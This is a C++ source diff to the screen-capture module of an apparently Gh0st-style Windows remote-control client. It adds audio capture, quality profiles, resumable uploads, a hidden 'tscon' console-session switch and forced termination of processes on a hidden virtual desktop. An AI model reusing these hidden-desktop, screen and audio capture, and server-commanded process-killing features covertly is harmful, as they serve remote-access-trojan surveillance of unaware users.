@@ -21,8 +21,40 @@
 #include <thread>
 #include "ClientDll.h"
 #include <common/iniFile.h>
+#include "KernelManager.h"
+#include <wtsapi32.h>
+#include <vector>
+#include <algorithm>
+
+// WASAPI 音频捕获
+#include <mmdeviceapi.h>
+#include <audioclient.h>
+#include <functiondiscoverykeys_devpkey.h>
+
+// KSDATAFORMAT_SUBTYPE_IEEE_FLOAT GUID (避免依赖 ksmedia.h)
+static const GUID KSDATAFORMAT_SUBTYPE_IEEE_FLOAT_LOCAL =
+    { 0x00000003, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
+
+// 检查 WAVEFORMATEXTENSIBLE 是否为浮点格式
+static BOOL IsFloatFormat(const WAVEFORMATEX* pWaveFmt)
+{
+    if (!pWaveFmt) return FALSE;
+
+    if (pWaveFmt->wFormatTag == WAVE_FORMAT_IEEE_FLOAT) {
+        return TRUE;
+    }
+
+    if (pWaveFmt->wFormatTag == WAVE_FORMAT_EXTENSIBLE &&
+        pWaveFmt->cbSize >= sizeof(WAVEFORMATEXTENSIBLE) - sizeof(WAVEFORMATEX)) {
+        const WAVEFORMATEXTENSIBLE* pWaveFmtEx = (const WAVEFORMATEXTENSIBLE*)pWaveFmt;
+        return IsEqualGUID(pWaveFmtEx->SubFormat, KSDATAFORMAT_SUBTYPE_IEEE_FLOAT_LOCAL);
+    }
+
+    return FALSE;
+}
 
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "wtsapi32.lib")
 
 #ifdef _WIN64
 #ifdef _DEBUG
@@ -62,12 +94,14 @@ bool IsWindows8orHigher()
     return false;
 }
 
-CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
+CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user, BOOL priv):CManager(ClientObject)
 {
 #ifndef PLUGIN
     extern ClientApp g_MyApp;
-    m_conn = g_MyApp.g_Connection;
-    InitFileUpload("", 64, 50, Logf);
+    SetConnection(g_MyApp.g_Connection);  // 同时设置 m_conn 和 m_MyClientID
+    CKernelManager* main = (CKernelManager*)ClientObject->GetMain();
+    InitFileUpload({}, main ? main->m_LoginMsg : ClientObject->m_LoginMsg, 
+        main ? main->m_LoginSignature : ClientObject->m_LoginSignature, 64, 50, Logf);
 #endif
     m_isGDI = TRUE;
     m_virtual = FALSE;
@@ -89,16 +123,39 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
     iniFile cfg(CLIENT_PATH);
     int m_nMaxFPS = cfg.GetInt("settings", "ScreenMaxFPS", 20);
     m_nMaxFPS = max(m_nMaxFPS, 1);
-	int threadNum = cfg.GetInt("settings", "ScreenCompressThread", 0);
+    int threadNum = cfg.GetInt("settings", "ScreenCompressThread", 0);
     m_ClientObject->SetMultiThreadCompress(threadNum);
 
+    // 启用多显示器支持时，需要固定传输质量
+    BYTE algo = ALGORITHM_DIFF;
+    BOOL all = FALSE;
+    if (!(user == NULL || ((int)user) == 1)) {
+        UserParam* param = (UserParam*)user;
+        if (param) {
+            algo = param->length > 1 ? param->buffer[1] : algo;
+            all = param->length > 2 ? param->buffer[2] : all;
+        }
+    }
+
+    BOOL fixedQuality = all || algo == ALGORITHM_H264;
     m_ScreenSettings.MaxFPS = m_nMaxFPS;
-	m_ScreenSettings.CompressThread = threadNum;
+    m_ScreenSettings.CompressThread = threadNum;
     m_ScreenSettings.ScreenStrategy = cfg.GetInt("settings", "ScreenStrategy", 0);
-	m_ScreenSettings.ScreenWidth = cfg.GetInt("settings", "ScreenWidth", 0);
-	m_ScreenSettings.ScreenHeight = cfg.GetInt("settings", "ScreenHeight", 0);
-	m_ScreenSettings.FullScreen = cfg.GetInt("settings", "FullScreen", 0);
+    m_ScreenSettings.ScreenWidth = cfg.GetInt("settings", "ScreenWidth", 0);
+    m_ScreenSettings.ScreenHeight = cfg.GetInt("settings", "ScreenHeight", 0);
+    m_ScreenSettings.FullScreen = cfg.GetInt("settings", "FullScreen", priv);
     m_ScreenSettings.RemoteCursor = cfg.GetInt("settings", "RemoteCursor", 0);
+    m_ScreenSettings.ScrollDetectInterval = cfg.GetInt("settings", "ScrollDetectInterval", 2);  // 默认每2帧
+    m_ScreenSettings.QualityLevel = cfg.GetInt("settings", "QualityLevel", fixedQuality ? QUALITY_GOOD : QUALITY_ADAPTIVE);
+    m_ScreenSettings.CpuSpeedup = cfg.GetInt("settings", "CpuSpeedup", 0);
+    m_ScreenSettings.AudioEnabled = cfg.GetInt("settings", "AudioEnabled", 0);  // 默认禁用音频
+
+    LoadQualityProfiles();  // 加载质量配置
+
+    // 初始化音频事件和线程（根据配置决定初始状态）
+    m_bAudioThreadRunning = TRUE;
+    m_hAudioEvent = CreateEvent(NULL, FALSE, m_ScreenSettings.AudioEnabled, NULL);
+    m_hAudioThread = __CreateThread(NULL, 0, AudioThreadProc, this, 0, NULL);
 
     m_hWorkThread = __CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
 }
@@ -113,13 +170,20 @@ bool CScreenManager::SwitchScreen()
 
 bool CScreenManager::RestartScreen()
 {
-    if (m_ScreenSpyObject == NULL)
+    if (m_ScreenSpyObject == NULL || m_bIsWorking == FALSE)
         return false;
+
+    // 1. 停止工作线程
     m_bIsWorking = FALSE;
-    DWORD s = WaitForSingleObject(m_hWorkThread, 3000);
+    DWORD s = WaitForSingleObject(m_hWorkThread, 1000);
     if (s == WAIT_TIMEOUT) {
-        TerminateThread(m_hWorkThread, -1);
+        TerminateThread(m_hWorkThread, 0x20260215);
     }
+
+    // 2. 删除旧的截屏对象
+    SAFE_DELETE(m_ScreenSpyObject);
+
+    // 3. 重新启动工作线程（InitScreenSpy 会创建新对象）
     m_bIsWorking = TRUE;
     m_SendFirst = FALSE;
     m_hWorkThread = __CreateThread(NULL, 0, WorkThreadProc, this, 0, NULL);
@@ -137,7 +201,7 @@ std::wstring ConvertToWString(const std::string& multiByteStr)
     return wideStr;
 }
 
-bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
+bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName, TCHAR* pszCommandLine = NULL)
 {
     bool bReturn = false;
 
@@ -146,7 +210,7 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
             return false;
 
         TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
-        TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
+        TCHAR szCommandLine[MAX_PATH * 4] = { 0 };
 
         strcpy_s(szDirectoryName, sizeof(szDirectoryName), pszApplicationFilePath);
 
@@ -154,6 +218,14 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
         if (!PathIsExe(path.c_str()))
             return false;
         PathRemoveFileSpec(szDirectoryName);
+
+        // 构建命令行：程序路径 + 参数
+        if (pszCommandLine && strlen(pszCommandLine) > 0) {
+            sprintf_s(szCommandLine, sizeof(szCommandLine), "\"%s\" %s", pszApplicationFilePath, pszCommandLine);
+        } else {
+            sprintf_s(szCommandLine, sizeof(szCommandLine), "\"%s\"", pszApplicationFilePath);
+        }
+
         STARTUPINFO sInfo = { 0 };
         PROCESS_INFORMATION pInfo = { 0 };
 
@@ -162,8 +234,8 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
 
         //Launching a application into desktop
         SetLastError(0);
-        BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
-                                    NULL,
+        BOOL bCreateProcessReturn = CreateProcess(NULL,  // lpApplicationName = NULL
+                                    szCommandLine,       // lpCommandLine 包含完整命令
                                     NULL,
                                     NULL,
                                     TRUE,
@@ -213,7 +285,8 @@ BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName)
 
         // 获取进程名
         HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
-        if (hProcess) {
+        if (hProcess)
+        {
             char exePath[MAX_PATH];
             DWORD size = MAX_PATH;
             if (QueryFullProcessImageName(hProcess, 0, exePath, &size)) {
@@ -228,6 +301,151 @@ BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName)
     }, reinterpret_cast<LPARAM>(&data));
 
     return bFound;
+}
+
+// 关闭指定桌面上的所有窗口和进程（用于重置虚拟桌面）
+void CloseAllWindowsInDesktop(HDESK hDesk)
+{
+    // 收集所有需要终止的进程ID（EnumDesktopWindows 不需要切换线程桌面）
+    std::vector<DWORD> processIds;
+    BOOL enumResult = EnumDesktopWindows(hDesk, [](HWND hWnd, LPARAM lParam) -> BOOL {
+        auto* pIds = (std::vector<DWORD>*)lParam;
+        DWORD pid = 0;
+        GetWindowThreadProcessId(hWnd, &pid);
+        if (pid != 0 && pid != GetCurrentProcessId()) {
+            // 避免重复
+            if (std::find(pIds->begin(), pIds->end(), pid) == pIds->end()) {
+                pIds->push_back(pid);
+            }
+        }
+        char title[256] = {};
+        GetWindowTextA(hWnd, title, sizeof(title));
+        Mprintf("枚举窗口: %s [%p] pid=%d\n", title, hWnd, pid);
+        // 先尝试正常关闭
+        PostMessageA(hWnd, WM_CLOSE, 0, 0);
+        return TRUE;
+    }, (LPARAM)&processIds);
+
+    if (!enumResult) {
+        Mprintf("EnumDesktopWindows failed: %d\n", GetLastError());
+    }
+
+    // 等待窗口关闭
+    Sleep(300);
+
+    // 强制终止所有相关进程
+    for (DWORD pid : processIds) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess) {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+            Mprintf("终止进程: %d\n", pid);
+        }
+    }
+
+    Mprintf("CloseAllWindowsInDesktop: 已处理 %d 个进程\n", (int)processIds.size());
+}
+
+// 检查当前进程是否以管理员身份运行
+static BOOL IsRunningAsAdmin()
+{
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+
+    if (AllocateAndInitializeSid(&ntAuthority, 2,
+            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+// 恢复控制台会话（解决 RDP 断开后黑屏问题）
+// 当用户通过 RDP 连接后断开，物理控制台可能处于 Disconnected 状态
+// 此函数检测并将活跃的 RDP 会话切换回控制台
+// 需要 SYSTEM 或管理员权限
+static BOOL RestoreConsoleSession()
+{
+    // 权限检查：需要 SYSTEM 或管理员权限
+    if (!IsRunningAsSystem() && !IsRunningAsAdmin()) {
+        Mprintf("[RestoreConsole] Insufficient privileges (need SYSTEM or Admin)\n");
+        return FALSE;
+    }
+
+    // 获取当前进程的会话ID
+    DWORD currentSessionId = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
+    Mprintf("[RestoreConsole] Current process session: %d\n", currentSessionId);
+
+    PWTS_SESSION_INFO pSessionInfo = NULL;
+    DWORD dwCount = 0;
+    DWORD targetSessionId = 0;
+    BOOL foundTarget = FALSE;
+    BOOL currentSessionDisconnected = FALSE;
+
+    if (!WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwCount)) {
+        Mprintf("[RestoreConsole] WTSEnumerateSessions failed: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    // 分析会话状态
+    for (DWORD i = 0; i < dwCount; i++) {
+        DWORD sid = pSessionInfo[i].SessionId;
+        WTS_CONNECTSTATE_CLASS state = pSessionInfo[i].State;
+        const char* name = pSessionInfo[i].pWinStationName;
+
+        Mprintf("[RestoreConsole] Session %d (%s): State=%d\n", sid, name, state);
+
+        // 如果当前进程在用户会话中（非Session 0），检查该会话是否断开
+        if (currentSessionId != 0 && sid == currentSessionId) {
+            if (state == WTSDisconnected) {
+                currentSessionDisconnected = TRUE;
+                targetSessionId = sid;
+                foundTarget = TRUE;
+                Mprintf("[RestoreConsole] Current session %d is disconnected\n", sid);
+            }
+        }
+        // 如果进程在Session 0（SYSTEM服务），查找断开的用户会话
+        else if (currentSessionId == 0 && state == WTSDisconnected && sid != 0 && sid < 65536) {
+            // 优先选择最小的会话ID（通常是用户的主会话）
+            if (!foundTarget || sid < targetSessionId) {
+                targetSessionId = sid;
+                foundTarget = TRUE;
+                Mprintf("[RestoreConsole] Found disconnected user session %d\n", sid);
+            }
+        }
+    }
+
+    WTSFreeMemory(pSessionInfo);
+
+    // 如果找到需要恢复的会话，执行 tscon 切换到控制台
+    if (foundTarget) {
+        char cmd[128];
+        sprintf(cmd, "tscon %d /dest:console", targetSessionId);
+        Mprintf("[RestoreConsole] Executing: %s\n", cmd);
+
+        STARTUPINFO si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            SAFE_CLOSE_HANDLE(pi.hProcess);
+            SAFE_CLOSE_HANDLE(pi.hThread);
+            Mprintf("[RestoreConsole] Session %d restored to console\n", targetSessionId);
+            Sleep(200);  // 等待桌面切换完成
+            return TRUE;
+        } else {
+            Mprintf("[RestoreConsole] CreateProcess failed: %d\n", GetLastError());
+        }
+    } else {
+        Mprintf("[RestoreConsole] No disconnected session to restore\n");
+    }
+
+    return FALSE;
 }
 
 void CScreenManager::InitScreenSpy()
@@ -247,7 +465,14 @@ void CScreenManager::InitScreenSpy()
     } else {
         DXGI = (int)user;
     }
-    Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
+    // 如果已设置质量等级，使用对应的算法（优先于启动参数）
+    int level = m_ScreenSettings.QualityLevel;
+    if (level >= 0 && level < QUALITY_COUNT) {
+        algo = m_QualityProfiles[level].algorithm;
+    }
+    // 保存屏幕类型，服务端用于判断是否显示虚拟桌面相关菜单
+    m_ScreenSettings.ScreenType = DXGI;
+    Mprintf("CScreenManager: Type %d Algorithm: %d (QualityLevel=%d)\n", DXGI, int(algo), level);
     if (DXGI == USING_VIRTUAL) {
         m_virtual = TRUE;
         HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
@@ -262,7 +487,17 @@ void CScreenManager::InitScreenSpy()
             GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
             strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
             if (!IsProcessRunningInDesktop(hDesk, szExplorerFile)) {
-                if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
+                // 使用 /separate 强制创建独立进程，否则 Explorer 会连接到已有的 Shell
+                if (LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str(), (TCHAR*)"/separate,C:\\")) {
+                    // 等待 Explorer 初始化完成（最多等待 3 秒）
+                    for (int i = 0; i < 30; i++) {
+                        Sleep(100);
+                        if (IsProcessRunningInDesktop(hDesk, szExplorerFile)) {
+                            Mprintf("Explorer 已启动，等待了 %d ms\n", (i + 1) * 100);
+                            break;
+                        }
+                    }
+                } else {
                     Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
                 }
             } else {
@@ -331,14 +566,36 @@ BOOL IsRunningAsSystem()
 
 BOOL CScreenManager::OnReconnect()
 {
-	auto duration = GetTickCount64() - m_nReconnectTime;
+    if (!m_bIsWorking) {
+        return FALSE;
+    }
+    auto duration = GetTickCount64() - m_nReconnectTime;
     if (duration <= 3000)
         Sleep(3000 - duration);
-	m_nReconnectTime = GetTickCount64();
+    m_nReconnectTime = GetTickCount64();
 
     m_SendFirst = FALSE;
     BOOL r = m_ClientObject ? m_ClientObject->Reconnect(this) : FALSE;
     Mprintf("CScreenManager OnReconnect '%s'\n", r ? "succeed" : "failed");
+
+    // 检查是否有未完成的文件传输（V2 断点续传）
+    if (r) {
+        auto pendingTransfers = GetPendingTransfers();
+        for (uint64_t transferID : pendingTransfers) {
+            Mprintf("检测到未完成传输: transferID=%llu\n", transferID);
+            // 尝试恢复本地状态
+            if (LoadResumeState(transferID)) {
+                Mprintf("已恢复传输状态，发送续传请求...\n");
+                // 构建并发送 RESUME_REQ 包
+                std::vector<uint8_t> resumeReq = BuildResumeRequest(transferID, m_MyClientID);
+                if (!resumeReq.empty()) {
+                    Send(resumeReq.data(), (UINT)resumeReq.size());
+                    Mprintf("已发送续传请求: transferID=%llu, size=%zu\n", transferID, resumeReq.size());
+                }
+            }
+        }
+    }
+
     return r;
 }
 
@@ -368,8 +625,8 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
     clock_t last_check = clock();
     timeBeginPeriod(1);
     while (This->m_bIsWorking) {
-        WAIT_n(This->m_bIsWorking && !This->IsConnected(), 6, 200);
-        if (!This->IsConnected()) This->OnReconnect();
+        WAIT_n(This->m_bIsWorking && !This->IsConnected(), 6, 50);
+        if (!This->IsConnected() && This->m_bIsWorking) This->OnReconnect();
         if (!This->IsConnected()) continue;
         if (!This->m_SendFirst && This->IsConnected()) {
             This->m_SendFirst = TRUE;
@@ -422,6 +679,12 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
                 }
             }
             last = clock();
+            // 发送待发送的自定义光标图像（在帧数据之前）
+            BYTE* cursorData = nullptr;
+            ULONG cursorSize = 0;
+            if (This->m_ScreenSpyObject->GetPendingCursorImage(&cursorData, &cursorSize)) {
+                This->m_ClientObject->Send2Server((char*)cursorData, cursorSize);
+            }
             This->SendNextScreen(szBuffer, ulNextSendLength);
         }
     }
@@ -453,6 +716,20 @@ CScreenManager::~CScreenManager()
     Mprintf("ScreenManager 析构函数\n");
     UninitFileUpload();
     m_bIsWorking = FALSE;
+    m_bAudioThreadRunning = FALSE;  // 停止音频线程
+
+    // 停止音频线程
+    if (m_hAudioEvent) {
+        SetEvent(m_hAudioEvent);  // 唤醒线程使其退出
+    }
+    if (m_hAudioThread) {
+        WaitForSingleObject(m_hAudioThread, 2000);
+        SAFE_CLOSE_HANDLE(m_hAudioThread);
+    }
+    if (m_hAudioEvent) {
+        SAFE_CLOSE_HANDLE(m_hAudioEvent);
+    }
+    UninitWASAPI();
 
     WaitForSingleObject(m_hWorkThread, INFINITE);
     if (m_hWorkThread!=NULL) {
@@ -496,6 +773,15 @@ bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
     return true;
 }
 
+bool SendDataV2(void* user, FileChunkPacketV2* chunk, BYTE* data, int size)
+{
+    IOCPClient* pClient = (IOCPClient*)user;
+    if (!pClient->IsConnected() || !pClient->Send2Server((char*)data, size)) {
+        return false;
+    }
+    return true;
+}
+
 void RecvData(void* ptr)
 {
     FileChunkPacket* pkt = (FileChunkPacket*)ptr;
@@ -516,6 +802,8 @@ void FinishSend(void* user)
 
 VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
+    if (!m_bIsWorking) return;
+
     switch(szBuffer[0]) {
     case COMMAND_BYE: {
         Mprintf("[CScreenManager] Received BYE: %s\n", ToPekingTimeAsString(0).c_str());
@@ -527,18 +815,18 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         SwitchScreen();
         break;
     }
-	case CMD_FULL_SCREEN: {
-		int fullScreen = szBuffer[1];
-		iniFile cfg(CLIENT_PATH);
-		cfg.SetInt("settings", "FullScreen", fullScreen);
-		m_ScreenSettings.FullScreen = fullScreen;
-		break;
-	}
+    case CMD_FULL_SCREEN: {
+        int fullScreen = szBuffer[1];
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "FullScreen", fullScreen);
+        m_ScreenSettings.FullScreen = fullScreen;
+        break;
+    }
     case CMD_REMOTE_CURSOR: {
-		int remoteCursor = szBuffer[1];
-		iniFile cfg(CLIENT_PATH);
-		cfg.SetInt("settings", "RemoteCursor", remoteCursor);
-		m_ScreenSettings.RemoteCursor = remoteCursor;
+        int remoteCursor = szBuffer[1];
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "RemoteCursor", remoteCursor);
+        m_ScreenSettings.RemoteCursor = remoteCursor;
         break;
     }
     case CMD_MULTITHREAD_COMPRESS: {
@@ -546,30 +834,80 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         m_ClientObject->SetMultiThreadCompress(threadNum);
         iniFile cfg(CLIENT_PATH);
         cfg.SetInt("settings", "ScreenCompressThread", threadNum);
-		m_ScreenSettings.CompressThread = threadNum;
+        m_ScreenSettings.CompressThread = threadNum;
         break;
     }
     case CMD_SCREEN_SIZE: {
-        int width, height, strategy = szBuffer[1];
-        memcpy(&width, szBuffer + 2, 4);
+        int maxWidth = 0, height = 0, strategy = szBuffer[1];
+        memcpy(&maxWidth, szBuffer + 2, 4);
         memcpy(&height, szBuffer + 6, 4);
+        Mprintf("收到 CMD_SCREEN_SIZE: strategy=%d, maxWidth=%d, height=%d\n", strategy, maxWidth, height);
+
         iniFile cfg(CLIENT_PATH);
-        cfg.SetInt("settings", "ScreenStrategy", strategy);
-        cfg.SetInt("settings", "ScreenWidth", width);
-        cfg.SetInt("settings", "ScreenHeight", height);
-        switch (strategy) {
-        case 0:
-            if (m_ScreenSpyObject && m_ScreenSpyObject->IsLargeScreen(1920, 1080)) RestartScreen();
-            break;
-        case 1:
-            if (m_ScreenSpyObject && !m_ScreenSpyObject->IsOriginalSize()) RestartScreen();
-            break;
-        default:
-            break;
+
+        // strategy=2 是自适应质量使用的临时策略，不覆盖用户的原始 ScreenStrategy
+        if (strategy == 2) {
+            if (maxWidth == 0) {
+                // maxWidth=0 表示"使用默认策略"，读取用户原来的设置
+                strategy = cfg.GetInt("settings", "ScreenStrategy", 0);
+                // ScreenStrategy 只能是 0 或 1，如果是其他值则回退到 0
+                if (strategy != 0 && strategy != 1) {
+                    strategy = 0;
+                    cfg.SetInt("settings", "ScreenStrategy", 0);  // 修复无效值
+                }
+                Mprintf("maxWidth=0, 回退到默认策略: strategy=%d\n", strategy);
+            }
+            // 保存自适应的 ScreenWidth，下次启动时作为初始值
+            cfg.SetInt("settings", "ScreenWidth", maxWidth);
+            Mprintf("写入配置: ScreenWidth=%d (保留原 ScreenStrategy)\n", maxWidth);
+        } else {
+            // strategy=0 或 1 是用户手动设置，写入配置
+            cfg.SetInt("settings", "ScreenStrategy", strategy);
+            cfg.SetInt("settings", "ScreenWidth", 0);  // 清除自定义 maxWidth
+            Mprintf("写入配置: ScreenStrategy=%d, ScreenWidth=0\n", strategy);
         }
-		m_ScreenSettings.ScreenStrategy = strategy;
-		m_ScreenSettings.ScreenWidth = width;
-		m_ScreenSettings.ScreenHeight = height;
+        cfg.SetInt("settings", "ScreenHeight", height);
+
+        bool needRestart = false;
+        if (m_ScreenSpyObject && m_ScreenSpyObject->GetBIData()) {
+            int currentWidth = m_ScreenSpyObject->GetCurrentWidth();
+            int fullWidth = m_ScreenSpyObject->GetScreenWidth();
+            Mprintf("当前宽度: %d, 原始宽度: %d\n", currentWidth, fullWidth);
+            switch (strategy) {
+            case 0:  // 1080p
+            {
+                // 当前分辨率与目标 1080p 限制不同时需要重启
+                int target1080Width = min(1920, fullWidth);
+                needRestart = (currentWidth != target1080Width);
+                Mprintf("strategy=0 (1080p), target=%d, needRestart=%d\n", target1080Width, needRestart);
+                break;
+            }
+            case 1:  // 原始
+                needRestart = !m_ScreenSpyObject->IsOriginalSize();
+                Mprintf("strategy=1 (原始), needRestart=%d\n", needRestart);
+                break;
+            case 2:  // 自适应质量调整 (maxWidth > 0，maxWidth=0 时已回退到 case 0/1)
+                needRestart = (maxWidth != currentWidth);
+                Mprintf("strategy=2 (自适应), maxWidth=%d, currentWidth=%d, needRestart=%d\n",
+                        maxWidth, currentWidth, needRestart);
+                break;
+            }
+        } else {
+            // 截屏对象不存在或未初始化，直接根据 strategy 决定是否重启
+            needRestart = (strategy == 2 && maxWidth > 0);
+            Mprintf("截屏对象未就绪, needRestart=%d\n", needRestart);
+        }
+
+        if (needRestart) {
+            Mprintf("重启截屏...\n");
+            RestartScreen();
+        } else {
+            Mprintf("不需要重启截屏\n");
+        }
+
+        m_ScreenSettings.ScreenStrategy = strategy;
+        m_ScreenSettings.ScreenWidth = maxWidth;
+        m_ScreenSettings.ScreenHeight = height;
         break;
     }
     case CMD_FPS: {
@@ -577,11 +915,146 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         m_nMaxFPS = max(m_nMaxFPS, 1);
         iniFile cfg(CLIENT_PATH);
         cfg.SetInt("settings", "ScreenMaxFPS", m_nMaxFPS);
-		m_ScreenSettings.MaxFPS = m_nMaxFPS;
+        m_ScreenSettings.MaxFPS = m_nMaxFPS;
+        break;
+    }
+    case CMD_SCROLL_INTERVAL: {
+        // 实时更新滚动检测间隔并保存
+        int interval = *(int*)(szBuffer + 1);
+        if (m_ScreenSpyObject) {
+            m_ScreenSpyObject->SetScrollDetectInterval(interval);
+            Mprintf("滚动检测间隔更新: %d\n", interval);
+        }
+        m_ScreenSettings.ScrollDetectInterval = interval;
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "ScrollDetectInterval", interval);
+        break;
+    }
+    case CMD_QUALITY_LEVEL: {
+        // 质量等级调整 (level: -2=关闭, -1=自适应, 0-5=具体等级)
+        int8_t level = (int8_t)szBuffer[1];  // 有符号，支持负值
+        int persist = ulLength >= 3 ? szBuffer[2] : 0;  // 是否保存到配置
+        m_ScreenSettings.QualityLevel = level;
+        // 保存到配置
+        if (persist) {
+            iniFile cfg(CLIENT_PATH);
+            cfg.SetInt("settings", "QualityLevel", level);
+        }
+        // 应用具体等级的配置
+        if (level == QUALITY_DISABLED) {
+            // 关闭模式：不修改任何设置，使用原有的算法和帧率配置
+            Mprintf("质量等级: 关闭 (使用原有设置)\n");
+        } else if (level >= 0 && level < QUALITY_COUNT) {
+            // 具体等级：应用本地配置
+            const QualityProfile& profile = m_QualityProfiles[level];
+            m_ScreenSettings.MaxFPS = profile.maxFPS;
+            bool needRestart = false;
+            if (m_ScreenSpyObject) {
+                // 如果当前是 H264 且码率变化，需要重启以重新创建编码器
+                bool isH264 = (m_ScreenSpyObject->GetAlgorithm() == ALGORITHM_H264);
+                bool bitRateChanged = m_ScreenSpyObject->SetBitRate(profile.bitRate);
+                if (isH264 && bitRateChanged) {
+                    needRestart = true;
+                }
+                m_ScreenSpyObject->SetAlgorithm(profile.algorithm);
+            }
+            Mprintf("质量等级: Level=%d, FPS=%d, Algo=%d, BitRate=%d\n", level, 
+                profile.maxFPS, profile.algorithm, profile.bitRate);
+            if (needRestart) {
+                Mprintf("H264 码率变化，重启截屏...\n");
+                RestartScreen();
+            }
+        } else {
+            // 自适应模式：由服务端动态调整
+            Mprintf("质量等级: 自适应模式\n");
+        }
+        break;
+    }
+    case CMD_INSTRUCTION_SET: {
+        int set = unsigned(szBuffer[1]);
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "CpuSpeedup", set);
+        if (m_ScreenSettings.CpuSpeedup != set)
+            RestartScreen();
+        m_ScreenSettings.CpuSpeedup = set;
+        Mprintf("使用的CPU加速指令集: %d\n", set);
+        break;
+    }
+    case CMD_QUALITY_PROFILES: {
+        // 接收服务端下发的质量配置
+        if (ulLength >= 1 + sizeof(QualityProfile) * QUALITY_COUNT) {
+            memcpy(m_QualityProfiles, szBuffer + 1, sizeof(QualityProfile) * QUALITY_COUNT);
+            SaveQualityProfiles();
+            Mprintf("收到质量配置更新\n");
+        }
+        break;
+    }
+    case CMD_RESTORE_CONSOLE: {
+        // RDP会话归位（恢复控制台会话）
+        if (RestoreConsoleSession()) {
+            // 成功后重启截屏线程以获取新的桌面句柄
+            RestartScreen();
+        }
+        else {
+            SwitchScreen();
+        }
+        break;
+    }
+    case CMD_RESET_VIRTUAL_DESKTOP: {
+        // 重置虚拟桌面：关闭所有窗口，然后重启截屏
+        if (m_virtual && g_hDesk) {
+            Mprintf("重置虚拟桌面...\n");
+            CloseAllWindowsInDesktop(g_hDesk);
+            // 等待窗口关闭
+            Sleep(500);
+            // 关闭桌面句柄使其被销毁
+            CloseDesktop(g_hDesk);
+            g_hDesk = nullptr;
+            // 重启截屏线程（会创建新的桌面）
+            RestartScreen();
+            Mprintf("虚拟桌面已重置\n");
+        }
+        break;
+    }
+    case CMD_SWITCH_WINDOW: {
+        // 切换窗口（类似 Alt+Tab）
+        SwitchToNextWindow();
+        break;
+    }
+    case CMD_AUDIO_CTRL: {
+        // 音频控制命令
+        if (ulLength >= 3) {
+            BYTE enable = szBuffer[1];
+            BYTE persist = szBuffer[2];
+            HandleAudioCtrl(enable, persist);
+        }
         break;
     }
     case COMMAND_NEXT: {
         m_DlgID = ulLength >= 9 ? *((uint64_t*)(szBuffer + 1)) : 0;
+        // 解析服务端能力标志（如果有）
+        if (ulLength >= 9 + sizeof(uint32_t)) {
+            uint32_t capabilities = *(uint32_t*)(szBuffer + 9);
+            if (m_ScreenSpyObject) {
+                m_ScreenSpyObject->SetServerCapabilities(capabilities);
+                if (capabilities & CAP_SCROLL_DETECT) {
+                    m_ScreenSpyObject->EnableScrollDetection(true);
+                    Mprintf("滚动检测已启用 (服务端支持)\n");
+                }
+            }
+        }
+        // 解析滚动检测间隔（优先使用服务端发送的值，否则使用本地保存的值）
+        if (ulLength >= 9 + sizeof(uint32_t) + sizeof(int)) {
+            int scrollInterval = *(int*)(szBuffer + 9 + sizeof(uint32_t));
